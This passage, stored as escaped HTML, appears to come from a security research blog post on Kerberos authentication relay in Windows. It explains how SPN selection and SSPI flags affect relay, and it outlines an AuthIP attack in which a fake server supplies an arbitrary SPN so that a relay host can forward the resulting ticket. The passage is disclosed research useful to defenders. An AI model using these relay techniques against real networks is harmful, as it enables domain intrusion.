target SMB service will fail as the ticket can&amp;#39;t be decrypted.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The requirement that the SPN is associated with the target service&amp;#39;s shared encryption key is why I assume few consider Kerberos relay attacks to be a major risk, if not impossible. There&amp;#39;s an assumption that an attacker cannot induce a client into generating a service ticket for an SPN which differs from the host the client is connecting to.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;However, there&amp;#39;s nothing inherently stopping Kerberos authentication being relayed if the attacker can control the SPN. The only way to stop relayed Kerberos authentication is for the service to protect itself through the use of signing/sealing or channel binding which rely on the shared knowledge between the client and server, but crucially not the attacker relaying the authentication. However, even now these service protections aren&amp;#39;t the default even on critical protocols such as LDAP.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;As the only limit on basic Kerberos relay (in the absence of service protections) is the selection of the SPN, this research focuses on how common protocols select the SPN and whether it can be influenced by the attacker to achieve Kerberos authentication relay.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.8vjgkoldr6oj\"&gt;&lt;span class=\"c6 c19\"&gt;Kerberos Relay Requirements&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It&amp;#39;s easy to demonstrate in a controlled environment that Kerberos relay is possible. We can write a simple client which uses the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://en.wikipedia.org/wiki/Security_Support_Provider_Interface\"&gt;Security Support Provider Interface (SSPI)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;APIs to communicate with the LSA and implement the network authentication. This client calls the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontextw\"&gt;InitializeSecurityContext&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;API which will generate an AP_REQ authentication token containing a Kerberos Service Ticket for an arbitrary SPN. This AP_REQ can be forwarded to an intermediate server and then relayed to the service the SPN represents. You&amp;#39;ll find this will work, again to reiterate, assuming that no service protections are in place.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;However, there are some caveats in the way a client calls &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;which will impact how useful the generated AP_REQ is even if the attacker can influence the SPN. If the client specifies any one of the following request flags, &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_CONFIDENTIALITY,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_REPLAY_DETECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_SEQUENCE_DETECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;then the generated AP_REQ will enable encryption and/or integrity checking. When the AP_REQ is received by the server using the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext\"&gt;AcceptSecurityContext&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API it will return a set of flags which indicate if the client enabled encryption or integrity checking. Some services use these &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/context-requirements\"&gt;returned flags&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;to opportunistically enable service protections. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;For example LDAP&amp;#39;s default setting is to enable signing/encryption if the client supports it. Therefore you shouldn&amp;#39;t be able to relay Kerberos authentication to LDAP if the client enabled any of these protections. However, other services such as HTTP don&amp;#39;t typically support signing and sealing and so will happily accept authentication tokens which specify the request flags.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Another caveat is the client could specify channel binding information, typically derived from the certificate used by the TLS channel used in the communication. The channel binding information can be controlled by the attacker, but not set to arbitrary values without a bug in the TLS implementation or the code which determines the channel binding information itself. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;While services have an option to only enable channel binding if it&amp;#39;s supported by the client, all Windows Kerberos AP_REQ tokens indicate support through the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b15648e2-439a-4d04-b8a2-2f34c45690f9\"&gt;KERB_AP_OPTIONS_CBT&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;options flag in the authenticator. &lt;/span&gt;&lt;span&gt;Sagi Sheinfeld et al did demonstrate (see slide 22 in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf\"&gt;their presentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;that if you can get the AP_REQ from a non-Windows source it will not set the options flag and so no channel binding is enforced, but that was apparently not something Microsoft will fix. It is also possible that a Windows client disables channel binding through a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/authentication-fails-non-windows-ntlm-kerberos-server\"&gt;registry configuration option&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;, although that seems to be unlikely in real world networks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;If the client specifies the &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_MUTUAL_AUTH&lt;/span&gt;&lt;span&gt;&amp;nbsp;request flag when generating the initial AP_REQ it will enable mutual authentication between the client and server. The client expects to receive an &lt;/span&gt;&lt;span class=\"c4\"&gt;Authentication Protocol Response (AP_REP)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;token from the server after sending the AP_REQ to prove it has possession of the shared encryption key. If the server doesn&amp;#39;t return a valid AP_REP the client can assume it&amp;#39;s a spoofed server and refuse to continue the communication. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;From a relay perspective, mutual authentication doesn&amp;#39;t really matter as the server is the target of the relay attack, not the client. The target server will assume the authentication has completed once it&amp;#39;s accepted the AP_REQ, so that&amp;#39;s all the attacker needs to forward. While the server will generate the AP_REP and return it to the attacker they can just drop it unless they need the relayed client to continue to participate in the communication for some reason.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One final consideration is that the SSPI APIs have two security packages which can be used to implement Kerberos authentication, &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;protocol wraps the AP_REQ (and other authentication tokens) in the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc4178\"&gt;SPNEGO protocol&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;whereas &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends the authentication tokens using a simple GSS-API wrapper (see &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc4121\"&gt;RFC4121&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;). &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The first potential issue is &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is by far the most likely package in use as it allows a network protocol the flexibility to use the most appropriate authentication protocol that the client and server both support. However, what happens if the client uses the raw &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos &lt;/span&gt;&lt;span&gt;package but the server uses &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span class=\"c3\"&gt;? &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;This isn&amp;#39;t a problem as the server implementation of &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;will pass the input token to the function &lt;/span&gt;&lt;span class=\"c4\"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"c4\"&gt;lsasrv.dll&lt;/span&gt;&lt;span&gt;&amp;nbsp;during the first call to &lt;/span&gt;&lt;span class=\"c4\"&gt;AcceptSecurityContext&lt;/span&gt;&lt;span&gt;. This function detects if the client has passed a GSS-API Kerberos token (or NTLM) and enables a pass through mode where &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;gets out of the way. Therefore even if the client uses the &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos &lt;/span&gt;&lt;span class=\"c3\"&gt;package you can still authenticate to the server and keep the client happy without having to extract the inner authentication token or wrap up response tokens.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One actual issue for relaying is the &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;protocol enables integrity protection (equivalent to passing &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the underlying package) so that it can generate a &lt;/span&gt;&lt;span class=\"c4\"&gt;Message Integrity Code (MIC)&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the authentication exchange to prevent tampering. Using the &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos &lt;/span&gt;&lt;span&gt;package directly won&amp;#39;t add integrity protection automatically. Therefore relaying Kerberos AP_REQs from &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;will likely hit issues related to automatic enabling of signing on the server. It is possible for a client to explicitly disable automatic integrity checking by passing the &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_NO_INTEGRITY&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;request attribute, but that&amp;#39;s not a common case.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It&amp;#39;s possible to disable &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;from the relay if the client passes an arbitrary authentication token to the first call of the &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. On the first call the &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation will call the &lt;/span&gt;&lt;span class=\"c4\"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;function to determine whether to enable authentication pass through. If the initial token is NTLM or looks like a Kerberos token then it&amp;#39;ll pass through directly to the underlying security package and it won&amp;#39;t set &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;, unless the client explicitly requested it. The byte sequence [0x00, 0x01, 0x40] is sufficient to get &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span class=\"c3\"&gt;to detect Kerberos, and the token is then discarded so it doesn&amp;#39;t have to contain any further valid data.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.tx92zzdoh7eu\"&gt;&lt;span class=\"c6 c19\"&gt;Sniffing and Proxying Traffic&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Before going into individual protocols that I&amp;#39;ve researched, it&amp;#39;s worth discussing some more obvious ways of getting access to Kerberos authentication targeted at other services. First is sniffing network traffic sent from client to the server. For example, if the Kerberos AP_REQ is sent to a service over an unencrypted network protocol and the attacker can view that traffic the AP_REQ could be extracted and relayed. The selection of the SPN will be based on the expected traffic so the attacker doesn&amp;#39;t need to do anything to influence it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The Kerberos authentication protocol has protections against this attack vector. The Kerberos AP_REQ doesn&amp;#39;t just contain the service ticket, it&amp;#39;s also accompanied by an &lt;/span&gt;&lt;span class=\"c4\"&gt;Authenticator&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which is encrypted using the ticket&amp;#39;s session key. This key is accessible by both the legitimate client and the service. The authenticator contains a timestamp of when it was generated, and the service can check if this authenticator is within an allowable time range and whether it has seen the timestamp already. This allows the service to reject replayed authenticators by caching recently received values, and the allowable time window prevents the attacker waiting for any cache to expire before replaying.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;What this means is that while an attacker could sniff the Kerberos authentication on the wire and relay it, if the service has already received the authenticator it would be rejected as being a replay. The only way to exploit it would be to somehow prevent the legitimate authentication request from reaching the service, or race the request so that the attacker&amp;#39;s packet is processed first.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;Note, &lt;/span&gt;&lt;span class=\"c8 c4\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc4120#section-3.2.3\"&gt;RFC4120&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c25 c14 c4\"&gt;&amp;nbsp;mentions the possibility of embedding the client&amp;#39;s network address in the authenticator so that the service could reject authentication coming from the wrong host. This isn&amp;#39;t used by the Windows Kerberos implementation as far as I can tell. No doubt it would cause too many false positives for the replay protection in anything but the simplest enterprise networks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Therefore the only reliable way to exploit this scenario would be to actively interpose on the network communications between the client and service. This is of course practical and has been demonstrated many times assuming the traffic isn&amp;#39;t protected using something like TLS with server verification. Various attacks would be possible such as ARP or DNS spoofing attacks or HTTP proxy redirection to perform the &lt;/span&gt;&lt;span&gt;interposition&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;of the traffic.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;However, active MitM of protocols is a known risk and therefore an enterprise might have technical defenses in place to mitigate the issue. Of course, if such enterprises have enabled all the recommended relay protections,it&amp;#39;s a moot point. Regardless, we&amp;#39;ll assume that MitM is impractical for existing services due to protections in place and consider how individual protocols handle SPN selection.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.jst25c8kuijh\"&gt;&lt;span class=\"c6 c19\"&gt;IPSec and AuthIP&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;My research into Kerberos authentication relay came about in part because I was looking into the implementation of IPSec on Windows as part of my firewall research. Specifically I was researching the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/eee3de64-3847-4451-978e-9513ff187d30\"&gt;AuthIP ISAKMP&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which allows for Windows authentication protocols to be used to establish IPsec Security Associations. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;I noticed that the AuthIP protocol has a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/9ab1ccc0-d92e-4ca4-bae9-1c93871399ac\"&gt;GSS-ID payload&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which can be sent from the server to the client. This payload contains the textual SPN to use for the Kerberos authentication during the AuthIP process. This SPN is passed verbatim to the SSPI &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;call by the AuthIP client.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;As no verification is done on the format of the SPN in the GSS-ID payload, it allows the attacker to fully control the values including the service class and instance name. Therefore if an attacker can induce a domain joined machine to connect to an attacker controlled service and negotiate AuthIP then a Kerberos AP_REQ for an arbitrary SPN can be captured for relay use. As this AP_REQ is never sent to the target of the SPN it will not be detected as a replay.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Inducing authentication isn&amp;#39;t necessarily difficult. Any IP traffic which is covered by the domain &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/configure-the-rules-to-require-encryption\"&gt;configured security connection rules&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;will attempt to perform AuthIP. For example it&amp;#39;s possible that a UDP response for a DNS request from the domain controller might be sufficient. AuthIP supports two authenticated users, the machine and the calling user. By default it seems the machine authenticates first, so if you convinced a Domain Controller to authenticate you&amp;#39;d get the DC computer account which c&lt;/span&gt;&lt;span&gt;ould be fairly exploitable.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;For interest&amp;#39;s sake, the SPN is also used to determine the computer account associated with the server. This computer account is then used with &lt;/span&gt;&lt;span class=\"c8 c4\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94\"&gt;Service For User (S4U)&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;to generate a local access token allowing the client to determine the identity of the server. However I don&amp;#39;t think this is that useful as the fake server can&amp;#39;t complete the authentication and the connection will be discarded.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The security connection rules use IP address ranges to determine what hosts need IPsec authentication. If these address ranges are too broad it&amp;#39;s also possible that ISAKMP AuthIP traffic might leak to external networks. For example if the rules don&amp;#39;t limit the network ranges to the enterprise&amp;#39;s addresses, then even a connection out to a public service could be accompanied by the ISAKMP AuthIP packet. This can be then exploited by an attacker who is not co-located on the enterprise network just by getting a client to connect to their server, such as through a web URL.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835\" border=\"0\" alt=\"Diagram of a relay using a fake AuthIP server\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;To summarize the attack process from the diagram:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c24 lst-kix_d25vxsk234hv-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;Induce a client computer to send some network traffic to &lt;/span&gt;&lt;span class=\"c4\"&gt;EVILHOST&lt;/span&gt;&lt;span&gt;. It doesn&amp;#39;t really matter what the traffic is, only that the IP address, type and port must match an IP security connection rule to use AuthIP. &lt;/span&gt;&lt;span class=\"c4\"&gt;EVILHOST &lt;/span&gt;&lt;span class=\"c3\"&gt;does not need to be domain joined to perform the attack.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The network traffic will get the Windows IPsec client to try and establish a security association with the target host.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;A fake AuthIP server on the target host receives the request to establish a security association and returns a GSS-ID payload. This payload contains the target SPN, for example &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS/FILESERVER&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The IPsec client uses the SPN to create an AP_REQ token and sends it to &lt;/span&gt;&lt;span class=\"c4\"&gt;EVILHOST&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;EVILHOST&lt;/span&gt;&lt;span&gt;&amp;nbsp;relays the Kerberos AP_REQ to the target service on &lt;/span&gt;&lt;span class=\"c4\"&gt;FILESERVER&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Relaying this AuthIP authentication isn&amp;#39;t ideal from an attacker&amp;#39;s perspective. As the authentication will be used to sign and seal the network traffic, the request context flags for the call to &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;will require integrity and confidentiality protection. For network protocols such as LDAP which default to requiring signing and sealing if the client supports it, this would prevent the relay attack from working. However if the service ignores the protection and doesn&amp;#39;t have any further checks in place this would be sufficient. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;This issue was &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2213\"&gt;reported to MSRC&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and assigned case number 66900. However Microsoft have indicated that it will not be fixed with a security bulletin. &lt;/span&gt;&lt;span&gt;I&amp;#39;ve described Microsoft&amp;#39;s rationale for not fixing this issue later in the blog post&lt;/span&gt;&lt;span&gt;. If you want to reproduce this issue there&amp;#39;s details on Project Zero&amp;#39;s &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2213\"&gt;issue tracker&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.27tuyymck8fh\"&gt;&lt;span class=\"c6 c19\"&gt;MSRPC&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;After discovering that AuthIP could allow for authentication relay the next protocol I looked at is &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page\"&gt;MSRPC&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The protocol supports &lt;/span&gt;&lt;span class=\"c4\"&gt;NTLM&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication protocols over connected network transports such as named pipes or TCP. These authentication protocols need to be opted into by the server using the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterauthinfo\"&gt;RpcServerRegisterAuthInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API by specifying the authentication service constants of &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_WINNT&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;respectively. When registering the authentication information the server can optionally specify the SPN that needs to be used by the client.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;However, this SPN isn&amp;#39;t actually used by the RPC server itself. Instead it&amp;#39;s registered with the runtime, and a client can query the server&amp;#39;s SPN using the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" 